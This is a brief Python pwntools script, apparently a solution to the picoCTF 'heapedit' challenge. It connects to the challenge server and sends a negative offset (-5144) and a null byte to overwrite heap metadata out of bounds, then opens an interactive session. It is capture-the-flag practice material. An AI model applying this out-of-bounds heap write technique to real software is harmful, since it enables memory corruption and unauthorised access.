#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./heapedit")
libc = ELF("./libc.so.6")


#io = process('./heapedit', env={"LD_PRELOAD":"./libc.so.6"})
#gdb.attach(io)
io = remote("mercury.picoctf.net", 49825)

io.sendlineafter('Address:',b'-5144')
io.sendlineafter('Value:',b'\x00')

io.interactive()
